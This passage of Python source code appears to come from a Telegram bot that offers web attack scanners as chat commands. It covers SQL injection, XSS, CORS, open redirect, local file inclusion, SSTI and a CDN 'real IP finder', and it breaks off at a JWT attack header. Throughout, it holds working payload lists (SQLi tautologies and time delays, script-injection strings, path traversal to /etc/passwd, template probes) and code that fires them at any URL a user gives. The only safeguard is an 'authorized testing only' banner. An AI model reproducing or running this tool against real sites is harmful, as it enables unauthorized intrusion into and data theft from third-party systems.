        filename=f"secrets_{re.sub(r'[^\w]','_',domain)}_{ts}.json",
        caption=f"🔑 `{domain}` | Found: `{total}`",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════════════════════════
# 💉  SQL INJECTION SCANNER  —  Fully Async
# ═══════════════════════════════════════════════════════════
_SQLI_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning: mysql", r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"postgresql error", r"pg::syntaxerror",
    r"ora-[0-9]{5}", r"sqlite3\.operationalerror",
    r"microsoft ole db provider for sql",
    r"mssql_query\(\)", r"syntax error.*sql",
    r"sql command not properly ended",
    r"division by zero", r"invalid query",
    r"mysql_fetch_array", r"supplied argument is not",
    r"column count doesn't match",
]
_SQLI_PAYLOADS = [
    ("'",              "error"),
    ("''",             "error"),
    ("' OR '1'='1",   "boolean"),
    ("' OR 1=1--",    "boolean"),
    ("\" OR \"1\"=\"1","boolean"),
    ("' AND SLEEP(2)--","time"),
    ("'; WAITFOR DELAY '0:0:2'--","time"),
    ("1 AND 1=1",     "boolean"),
    ("1 AND 1=2",     "boolean"),
    ("' UNION SELECT NULL--","union"),
    ("' UNION SELECT NULL,NULL--","union"),
    ("admin'--",       "error"),
    ("' OR 'x'='x",   "boolean"),
    ("\\",             "error"),
]

async def _async_sqli(url: str, progress_cb=None) -> dict:
    """Async SQLi scanner — Error + Boolean + Time-based."""
    res = {"vulnerable": False, "findings": [], "params_tested": [],
           "payloads_tested": 0, "method": "GET"}

    def progress(m):
        if progress_cb:
            progress_cb(m)

    # Parse URL for GET params
    p = urlparse(url)
    params = dict(part.split("=", 1) for part in p.query.split("&") if "=" in part)
    base   = f"{p.scheme}://{p.netloc}{p.path}"

    if not params:
        # Try to discover params from page
        r0 = await async_fetch(url, timeout=10)
        if r0:
            soup = BeautifulSoup(r0["text"], _BS)
            for form in soup.find_all("form"):
                for inp in form.find_all(["input","textarea","select"]):
                    n = inp.get("name","")
                    if n:
                        params[n] = inp.get("value","test")
                        res["method"] = (form.get("method","GET") or "GET").upper()
            if not params:
                res["error"] = "No parameters found to test"
                return res

    # Baseline response (original params)
    baseline = await async_fetch(url, timeout=10)
    baseline_len  = len(baseline["text"]) if baseline else 0
    baseline_text = (baseline["text"] or "").lower() if baseline else ""

    progress(f"💉 Testing {len(params)} params × {len(_SQLI_PAYLOADS)} payloads...")

    for param_name, original_val in params.items():
        res["params_tested"].append(param_name)
        for payload, ptype in _SQLI_PAYLOADS:
            if ptype == "time":
                t0   = time.time()
                test_params = {**params, param_name: original_val + payload}
                test_url = base + "?" + "&".join(f"{k}={quote(v)}" for k, v in test_params.items())
                r = await async_fetch(test_url, timeout=6)
                elapsed = time.time() - t0
                res["payloads_tested"] += 1
                if elapsed >= 1.8:
                    res["vulnerable"] = True
                    res["findings"].append({
                        "param": param_name, "type": "Time-based SQLi",
                        "payload": payload, "evidence": f"Delay {elapsed:.1f}s",
                        "severity": "🔴 CRITICAL"
                    })
                    break
            else:
                test_params = {**params, param_name: original_val + payload}
                test_url = base + "?" + "&".join(f"{k}={quote(v)}" for k, v in test_params.items())
                r = await async_fetch(test_url, timeout=8)
                res["payloads_tested"] += 1
                if not r:
                    continue
                rtext = r["text"].lower()
                if ptype == "error":
                    for err_pat in _SQLI_ERRORS:
                        if re.search(err_pat, rtext, re.I):
                            res["vulnerable"] = True
                            res["findings"].append({
                                "param": param_name, "type": "Error-based SQLi",
                                "payload": payload, "evidence": err_pat,
                                "severity": "🔴 CRITICAL"
                            })
                            break
                elif ptype == "boolean":
                    diff = abs(len(r["text"]) - baseline_len)
                    if diff > 200 and baseline_len > 0:
                        res["vulnerable"] = True
                        res["findings"].append({
                            "param": param_name, "type": "Boolean-based SQLi",
                            "payload": payload, "evidence": f"Len diff: {diff}",
                            "severity": "🟠 HIGH"
                        })
                elif ptype == "union":
                    if "null" in rtext and "syntax" not in rtext:
                        res["vulnerable"] = True
                        res["findings"].append({
                            "param": param_name, "type": "UNION-based SQLi",
                            "payload": payload, "evidence": "UNION accepted",
                            "severity": "🔴 CRITICAL"
                        })
    return res

async def cmd_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "💉 *SQL Injection Scanner*\n"
            "`/sqli https://site.com/page?id=1`\n\n"
            "Tests: Error-based, Boolean-based, Time-based, UNION\n"
            "DBs: MySQL, PostgreSQL, MSSQL, Oracle, SQLite\n"
            "⚠️ Authorized testing only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans[uid]}` running", parse_mode="Markdown")
        return
    _active_scans[uid] = "SQLi Scan"
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"💉 *SQLi Scanner — `{domain}`*\n\n⏳ Testing parameters...", parse_mode="Markdown"
    )
    progress_msgs = []

    async def _prog():
        while True:
            await asyncio.sleep(2.5)
            if progress_msgs:
                txt = progress_msgs[-1]
                progress_msgs.clear()
                try:
                    await safe_edit(msg, f"💉 *SQLi — `{domain}`*\n\n{txt}", parse_mode="Markdown")
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        async with scan_semaphore:
            data = await _async_sqli(url, lambda t: progress_msgs.append(t))
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    vuln_icon = "🔴 VULNERABLE" if data["vulnerable"] else "✅ Clean"
    lines = [
        f"💉 *SQLi Scanner — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {vuln_icon}",
        f"Params tested: `{len(data['params_tested'])}` | Payloads: `{data['payloads_tested']}`",
    ]
    if data["vulnerable"]:
        lines.append(f"\n*🔴 Findings ({len(data['findings'])}):*")
        for f in data["findings"]:
            lines.append(f"  {f['severity']} `{f['param']}`")
            lines.append(f"  Type: `{f['type']}`")
            lines.append(f"  Payload: `{f['payload'][:40]}`")
            lines.append(f"  Evidence: `{f['evidence'][:60]}`\n")
    else:
        lines.append("\n✅ No SQLi vulnerabilities detected")
    if data.get("error"):
        lines.append(f"\n⚠️ `{data['error']}`")
    lines.append("\n⚠️ _Authorized testing only_")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🎯  XSS SCANNER  —  Fully Async
# ═══════════════════════════════════════════════════════════
_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '"><body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<<script>alert(1)//<</script>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '`-alert(1)-`',
    '<details open ontoggle=alert(1)>',
    '"><details open ontoggle=alert(1)>',
    "';alert(1)//",
    '\';alert(1)//',
    '<input autofocus onfocus=alert(1)>',
    '"><input autofocus onfocus=alert(1)>',
    '<marquee onstart=alert(1)>',
]

async def _async_xss(url: str, progress_cb=None) -> dict:
    res = {"vulnerable": False, "findings": [], "dom_sinks": [],
           "payloads_tested": 0, "params_tested": []}

    def progress(m):
        if progress_cb:
            progress_cb(m)

    p = urlparse(url)
    params = dict(part.split("=", 1) for part in p.query.split("&") if "=" in part)
    base   = f"{p.scheme}://{p.netloc}{p.path}"

    # Discover form params
    r0 = await async_fetch(url, timeout=10)
    if not r0:
        res["error"] = "Failed to fetch"
        return res

    soup = BeautifulSoup(r0["text"], _BS)
    for form in soup.find_all("form"):
        for inp in form.find_all(["input","textarea","select"]):
            n = inp.get("name","")
            if n and n not in params:
                params[n] = inp.get("value","test")

    # DOM sink detection
    DOM_SINKS = [
        "innerHTML", "outerHTML", "document.write",
        "eval(", ".src =", "location.href", "window.location"
    ]
    for sink in DOM_SINKS:
        if sink in r0["text"]:
            res["dom_sinks"].append(sink)

    if not params:
        res["error"] = "No parameters found"
        return res

    progress(f"🎯 Testing {len(params)} params × {len(_XSS_PAYLOADS)} payloads...")

    for param, orig_val in params.items():
        res["params_tested"].append(param)
        for payload in _XSS_PAYLOADS[:10]:  # limit to 10 per param for speed
            encoded = quote(payload)
            test_params = {**params, param: payload}
            test_url = base + "?" + "&".join(f"{k}={quote(v)}" for k, v in test_params.items())
            r = await async_fetch(test_url, timeout=8)
            res["payloads_tested"] += 1
            if not r:
                continue
            # Check if payload is reflected unencoded
            if payload in r["text"] or payload.lower() in r["text"].lower():
                res["vulnerable"] = True
                res["findings"].append({
                    "param": param, "type": "Reflected XSS",
                    "payload": payload[:60], "context": "HTML Body",
                    "severity": "🔴 HIGH"
                })
                break
        await asyncio.sleep(0)  # yield to event loop
    return res

async def cmd_xss(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🎯 *XSS Scanner*\n`/xss https://site.com/page?q=test`\n\n"
            "Tests: Reflected XSS, DOM sink analysis, Form fields\n"
            "⚠️ Authorized testing only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans[uid]}` running", parse_mode="Markdown")
        return
    _active_scans[uid] = "XSS Scan"
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🎯 *XSS Scanner — `{domain}`*\n\n⏳ Testing parameters...", parse_mode="Markdown"
    )
    progress_msgs = []

    async def _prog():
        while True:
            await asyncio.sleep(2.5)
            if progress_msgs:
                try:
                    await safe_edit(msg,
                        f"🎯 *XSS — `{domain}`*\n\n{progress_msgs[-1]}", parse_mode="Markdown")
                    progress_msgs.clear()
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        async with scan_semaphore:
            data = await _async_xss(url, lambda t: progress_msgs.append(t))
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    vuln_icon = "🔴 VULNERABLE" if data["vulnerable"] else "✅ Clean"
    lines = [
        f"🎯 *XSS Scanner — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {vuln_icon}",
        f"Params: `{len(data['params_tested'])}` | Payloads: `{data['payloads_tested']}`",
    ]
    if data["dom_sinks"]:
        lines.append(f"\n⚠️ *DOM Sinks Detected:*")
        for s in data["dom_sinks"][:5]:
            lines.append(f"  🟡 `{s}`")
    if data["findings"]:
        lines.append(f"\n*🔴 Findings ({len(data['findings'])}):*")
        for f in data["findings"][:6]:
            lines.append(f"  {f['severity']} `{f['param']}`")
            lines.append(f"  Type: `{f['type']}`")
            lines.append(f"  Payload: `{f['payload'][:50]}`\n")
    else:
        lines.append("\n✅ No XSS vulnerabilities detected")
    lines.append("\n⚠️ _Authorized testing only_")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🌐  CORS SCANNER  —  Fully Async
# ═══════════════════════════════════════════════════════════
async def _async_cors(url: str) -> dict:
    res = {"misconfigs": [], "status": "✅ Secure", "tested": 0}
    ORIGINS = [
        "https://evil.com", "https://attacker.com",
        "null", "https://subdomain.evil.com",
        f"https://{urlparse(url).hostname}.evil.com",
        "http://localhost",
    ]
    for origin in ORIGINS:
        r = await async_fetch(url, headers={"Origin": origin}, timeout=8)
        res["tested"] += 1
        if not r:
            continue
        acao = r["headers"].get("Access-Control-Allow-Origin", "")
        acac = r["headers"].get("Access-Control-Allow-Credentials", "")
        if acao == "*" and acac.lower() == "true":
            res["misconfigs"].append({
                "origin": origin, "acao": acao, "acac": acac,
                "severity": "🔴 CRITICAL", "detail": "Wildcard + Credentials = data theft"
            })
        elif acao == origin and acac.lower() == "true":
            res["misconfigs"].append({
                "origin": origin, "acao": acao, "acac": acac,
                "severity": "🔴 HIGH", "detail": "Origin reflected + Credentials"
            })
        elif acao == origin:
            res["misconfigs"].append({
                "origin": origin, "acao": acao, "acac": acac,
                "severity": "🟡 MEDIUM", "detail": "Origin reflected (no credentials)"
            })
        elif acao == "null":
            res["misconfigs"].append({
                "origin": origin, "acao": acao, "acac": acac,
                "severity": "🟠 HIGH", "detail": "null origin accepted"
            })
    if res["misconfigs"]:
        res["status"] = "🔴 VULNERABLE"
    return res

async def cmd_cors(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🌐 *CORS Scanner*\n`/cors https://example.com`\n\n"
            "Tests: Origin reflection, Wildcard+Credentials, null origin\n"
            "⚠️ Authorized testing only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🌐 *CORS Scanner — `{domain}`*\n\n⏳ Testing origins...", parse_mode="Markdown"
    )
    _active_scans[uid] = "CORS Scan"
    try:
        data = await _async_cors(url)
    except Exception as e:
        await safe_edit(msg, f"❌ Error: `{e}`", parse_mode="Markdown")
        return
    finally:
        _active_scans.pop(uid, None)

    lines = [
        f"🌐 *CORS — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Status: {data['status']}",
        f"Origins tested: `{data['tested']}`",
    ]
    if data["misconfigs"]:
        lines.append(f"\n*Findings ({len(data['misconfigs'])}):*")
        for m in data["misconfigs"]:
            lines.append(f"\n  {m['severity']}")
            lines.append(f"  Origin: `{m['origin']}`")
            lines.append(f"  ACAO: `{m['acao']}`")
            lines.append(f"  Credentials: `{m['acac'] or 'false'}`")
            lines.append(f"  ⚠️ {m['detail']}")
    else:
        lines.append("\n✅ No CORS misconfigurations found")
    lines.append("\n⚠️ _Authorized testing only_")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🔀  OPEN REDIRECT SCANNER
# ═══════════════════════════════════════════════════════════
async def _async_openredirect(url: str) -> dict:
    res = {"vulnerable": False, "findings": [], "params_tested": []}
    p = urlparse(url)
    params = dict(part.split("=",1) for part in p.query.split("&") if "=" in part)
    base   = f"{p.scheme}://{p.netloc}{p.path}"
    REDIRECT_PAYLOADS = [
        "https://evil.com", "//evil.com", "/\\evil.com",
        "https://evil.com%2f%2f", "https:evil.com",
        "%0d%0ahttps://evil.com", "javascript:alert(1)",
    ]
    REDIRECT_PARAMS = ["url","redirect","return","next","to","goto","redir","location",
                       "continue","forward","out","target","dest","destination","ref"]
    # Add known redirect params if not in URL
    for rp in REDIRECT_PARAMS:
        if rp not in params:
            params[rp] = "https://example.com"
    for param in params:
        res["params_tested"].append(param)
        for payload in REDIRECT_PAYLOADS:
            test_params = {**params, param: payload}
            test_url    = base + "?" + "&".join(f"{k}={quote(v)}" for k, v in test_params.items())
            r = await async_fetch(test_url, allow_redirects=False, timeout=8)
            if not r:
                continue
            if r["status"] in (301, 302, 303, 307, 308):
                loc = r["headers"].get("Location", "")
                if "evil.com" in loc or payload in loc:
                    res["vulnerable"] = True
                    res["findings"].append({
                        "param": param, "payload": payload,
                        "redirect_to": loc, "severity": "🟠 HIGH"
                    })
                    break
    return res

async def cmd_openredirect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🔀 *Open Redirect Scanner*\n`/openredirect https://site.com`\n⚠️ Authorized only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🔀 *Open Redirect — `{domain}`*\n\n⏳ Testing...", parse_mode="Markdown"
    )
    _active_scans[uid] = "OpenRedirect Scan"
    try:
        data = await _async_openredirect(url)
    finally:
        _active_scans.pop(uid, None)

    lines = [
        f"🔀 *Open Redirect — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {'🔴 VULNERABLE' if data['vulnerable'] else '✅ Clean'}",
        f"Params tested: `{len(data['params_tested'])}`",
    ]
    if data["findings"]:
        for f in data["findings"][:5]:
            lines.append(f"\n  {f['severity']} `{f['param']}`")
            lines.append(f"  Payload: `{f['payload']}`")
            lines.append(f"  Redirects to: `{f['redirect_to'][:60]}`")
    lines.append("\n⚠️ _Authorized testing only_")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 📂  LFI SCANNER
# ═══════════════════════════════════════════════════════════
_LFI_PAYLOADS = [
    "../../../etc/passwd", "../../../../etc/passwd",
    "../../../../../etc/passwd", "../../../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%5c..%5cwindows%5cwin.ini", "../../windows/win.ini",
    "/etc/passwd", "c:\\windows\\win.ini",
    "....//....//etc/passwd", "..././..././etc/passwd",
]
_LFI_INDICATORS = [
    r"root:x:0:0", r"daemon:x:", r"\[fonts\]",
    r"\[extensions\]", r"for 16-bit", r"nobody:x:",
]

async def _async_lfi(url: str) -> dict:
    res = {"vulnerable": False, "findings": [], "params_tested": []}
    p = urlparse(url)
    params = dict(part.split("=",1) for part in p.query.split("&") if "=" in part)
    base   = f"{p.scheme}://{p.netloc}{p.path}"
    LFI_PARAMS = ["file","page","include","path","template","dir","doc",
                  "folder","root","pg","style","content","layout","module"]
    for lp in LFI_PARAMS:
        if lp not in params:
            params[lp] = "index"
    for param, orig_val in params.items():
        res["params_tested"].append(param)
        for payload in _LFI_PAYLOADS[:8]:
            test_params = {**params, param: payload}
            test_url    = base + "?" + "&".join(f"{k}={quote(v)}" for k, v in test_params.items())
            r = await async_fetch(test_url, timeout=8)
            if not r:
                continue
            for indicator in _LFI_INDICATORS:
                if re.search(indicator, r["text"]):
                    res["vulnerable"] = True
                    res["findings"].append({
                        "param": param, "payload": payload,
                        "indicator": indicator, "severity": "🔴 CRITICAL"
                    })
                    break
            if res["vulnerable"]:
                break
    return res

async def cmd_lfi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "📂 *LFI Scanner*\n`/lfi https://site.com/page?file=index`\n⚠️ Authorized only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"📂 *LFI Scanner — `{domain}`*\n\n⏳ Testing...", parse_mode="Markdown"
    )
    _active_scans[uid] = "LFI Scan"
    try:
        data = await _async_lfi(url)
    finally:
        _active_scans.pop(uid, None)
    lines = [
        f"📂 *LFI Scanner — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {'🔴 VULNERABLE' if data['vulnerable'] else '✅ Clean'}",
        f"Params tested: `{len(data['params_tested'])}`",
    ]
    if data["findings"]:
        for f in data["findings"][:4]:
            lines.append(f"\n  {f['severity']} `{f['param']}`")
            lines.append(f"  Payload: `{f['payload']}`")
            lines.append(f"  Indicator: `{f['indicator']}`")
    lines.append("\n⚠️ _Authorized testing only_")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🔥  SSTI SCANNER
# ═══════════════════════════════════════════════════════════
_SSTI_PAYLOADS = [
    ("{{7*7}}",        "49",     "Jinja2/Twig"),
    ("${7*7}",         "49",     "Freemarker/Thymeleaf"),
    ("<%= 7*7 %>",     "49",     "ERB/EJS"),
    ("#{7*7}",         "49",     "Pebble"),
    ("{{7*'7'}}",      "7777777","Jinja2"),
    ("*{7*7}",         "49",     "Spring SpEL"),
    ("{% 7*7 %}",     "49",     "Smarty"),
    ("${{7*7}}",       "49",     "Twig strict"),
    ("{{config}}",     "config", "Jinja2 config leak"),
    ("${class.getClassLoader()}", "ClassLoader", "Java"),
]

async def _async_ssti(url: str) -> dict:
    res = {"vulnerable": False, "findings": [], "params_tested": []}
    p = urlparse(url)
    params = dict(part.split("=",1) for part in p.query.split("&") if "=" in part)
    base   = f"{p.scheme}://{p.netloc}{p.path}"
    if not params:
        r0 = await async_fetch(url, timeout=10)
        if r0:
            soup = BeautifulSoup(r0["text"], _BS)
            for inp in soup.find_all(["input","textarea"]):
                n = inp.get("name","")
                if n:
                    params[n] = inp.get("value","test")
    for param, orig_val in params.items():
        res["params_tested"].append(param)
        for payload, expected, engine in _SSTI_PAYLOADS:
            test_params = {**params, param: payload}
            test_url    = base + "?" + "&".join(f"{k}={quote(v)}" for k, v in test_params.items())
            r = await async_fetch(test_url, timeout=8)
            if not r:
                continue
            if expected in r["text"]:
                res["vulnerable"] = True
                res["findings"].append({
                    "param": param, "payload": payload,
                    "expected": expected, "engine": engine,
                    "severity": "🔴 CRITICAL"
                })
                break
    return res

async def cmd_ssti(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🔥 *SSTI Scanner*\n`/ssti https://site.com/page?name=test`\n\n"
            "Tests: Jinja2, Twig, Freemarker, ERB, SpEL\n⚠️ Authorized testing only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🔥 *SSTI Scanner — `{domain}`*\n\n⏳ Testing...", parse_mode="Markdown"
    )
    _active_scans[uid] = "SSTI Scan"
    try:
        data = await _async_ssti(url)
    finally:
        _active_scans.pop(uid, None)
    lines = [
        f"🔥 *SSTI Scanner — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {'🔴 VULNERABLE' if data['vulnerable'] else '✅ Clean'}",
        f"Params tested: `{len(data['params_tested'])}`",
    ]
    if data["findings"]:
        for f in data["findings"][:4]:
            lines.append(f"\n  {f['severity']} `{f['param']}`")
            lines.append(f"  Engine: `{f['engine']}`")
            lines.append(f"  Payload: `{f['payload']}`")
    else:
        lines.append("\n✅ No SSTI vulnerabilities detected")
    lines.append("\n⚠️ _Authorized testing only_")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# ☁️  CLOUD CHECK / REAL IP FINDER
# ═══════════════════════════════════════════════════════════
async def _async_cloudcheck(domain: str) -> dict:
    res = {
        "behind_cdn": False, "cdn_provider": "", "real_ips": [],
        "dns_ips": [], "mx_ips": [], "subdomains": [],
        "historical": [], "spf_ips": [],
    }
    # Direct DNS A record
    try:
        import socket as _s
        ip = _s.gethostbyname(domain)
        res["dns_ips"].append(ip)
    except Exception:
        pass

    # Parallel checks
    tasks = []

    async def _check_mx():
        try:
            mx_r = await async_fetch(f"https://dns.google/resolve?name={domain}&type=MX", timeout=8)
            if mx_r and mx_r["text"]:
                data = json.loads(mx_r["text"])
                for ans in data.get("Answer", []):
                    mx_host = ans.get("data","").split()[-1].rstrip(".")
                    if mx_host:
                        try:
                            mx_ip = socket.gethostbyname(mx_host)
                            res["mx_ips"].append(mx_ip)
                        except Exception:
                            pass
        except Exception:
            pass

    async def _check_subdomain_ips():
        common_subs = ["mail","smtp","ftp","cpanel","direct","dev","api",
                       "test","staging","beta","admin","vpn","remote"]
        sub_tasks   = []
        for sub in common_subs:
            fqdn = f"{sub}.{domain}"
            sub_tasks.append(async_fetch(
                f"https://dns.google/resolve?name={fqdn}&type=A", timeout=6
            ))
        sub_results = await asyncio.gather(*sub_tasks, return_exceptions=True)
        for i, r in enumerate(sub_results):
            if isinstance(r, dict) and r and r.get("text"):
                try:
                    d = json.loads(r["text"])
                    for ans in d.get("Answer", []):
                        ip = ans.get("data","")
                        if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
                            sub = f"{common_subs[i]}.{domain}"
                            res["subdomains"].append({"sub": sub, "ip": ip})
                            if ip not in res["dns_ips"]:
                                res["real_ips"].append(ip)
                except Exception:
                    pass

    async def _check_spf():
        try:
            spf_r = await async_fetch(
                f"https://dns.google/resolve?name={domain}&type=TXT", timeout=8
            )
            if spf_r and spf_r["text"]:
                d = json.loads(spf_r["text"])
                for ans in d.get("Answer", []):
                    txt = ans.get("data","")
                    if "v=spf1" in txt:
                        for ip_match in re.findall(r"ip[46]:([^\s]+)", txt):
                            res["spf_ips"].append(ip_match)
        except Exception:
            pass

    await asyncio.gather(_check_mx(), _check_subdomain_ips(), _check_spf())

    # CDN detection
    CDN_RANGES = {
        "Cloudflare": ["103.21.244.","103.22.200.","103.31.4.","104.16.","104.17.",
                       "108.162.","172.64.","172.65.","172.66.","172.67.",
                       "188.114.","190.93.","197.234.","198.41."],
        "AWS CloudFront": ["13.32.","13.33.","13.35.","52.84.","52.85.","52.222.",
                           "54.182.","54.192.","54.230.","64.252.","70.132."],
        "Akamai": ["23.32.","23.33.","23.64.","23.65.","23.66.","23.192.","23.193."],
        "Fastly": ["23.235.","199.27.","103.244."],
    }
    for ip in res["dns_ips"]:
        for cdn, ranges in CDN_RANGES.items():
            if any(ip.startswith(r) for r in ranges):
                res["behind_cdn"] = True
                res["cdn_provider"] = cdn
                break
    return res

async def cmd_cloudcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "☁️ *Cloud Check / Real IP Finder*\n`/cloudcheck example.com`\n\n"
            "Checks: CDN detection, MX records, subdomain IPs, SPF records",
            parse_mode="Markdown"
        )
        return
    domain_raw = context.args[0].strip()
    domain = domain_raw.replace("https://","").replace("http://","").split("/")[0]
    safe_ok, reason = is_safe_url(f"https://{domain}")
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    msg = await update.effective_message.reply_text(
        f"☁️ *Cloud Check — `{domain}`*\n\n⏳ Checking CDN + DNS...", parse_mode="Markdown"
    )
    _active_scans[uid] = "Cloud Check"
    try:
        data = await _async_cloudcheck(domain)
    except Exception as e:
        await safe_edit(msg, f"❌ Error: `{e}`", parse_mode="Markdown")
        return
    finally:
        _active_scans.pop(uid, None)

    cdn_icon = "⚠️ Behind CDN" if data["behind_cdn"] else "✅ No CDN detected"
    lines    = [
        f"☁️ *Cloud Check — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"CDN: {cdn_icon}",
    ]
    if data["cdn_provider"]:
        lines.append(f"Provider: `{data['cdn_provider']}`")
    if data["dns_ips"]:
        lines.append(f"\n📍 *Direct DNS IPs:*")
        for ip in data["dns_ips"][:5]:
            lines.append(f"  `{ip}`")
    if data["mx_ips"]:
        lines.append(f"\n📧 *MX Record IPs:*")
        for ip in data["mx_ips"][:5]:
            lines.append(f"  `{ip}` ← Possible real IP")
    if data["subdomains"]:
        lines.append(f"\n🔎 *Subdomain IPs ({len(data['subdomains'])}):*")
        for s in data["subdomains"][:8]:
            lines.append(f"  `{s['sub']}` → `{s['ip']}`")
    if data["spf_ips"]:
        lines.append(f"\n📋 *SPF IPs:*")
        for ip in data["spf_ips"][:5]:
            lines.append(f"  `{ip}`")
    if data["real_ips"]:
        lines.append(f"\n🎯 *Potential Real IPs:*")
        for ip in set(data["real_ips"])[:5]:
            lines.append(f"  🔑 `{ip}`")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🔑  JWT ATTACK
# ═══════════════════════════════════════════════════════════
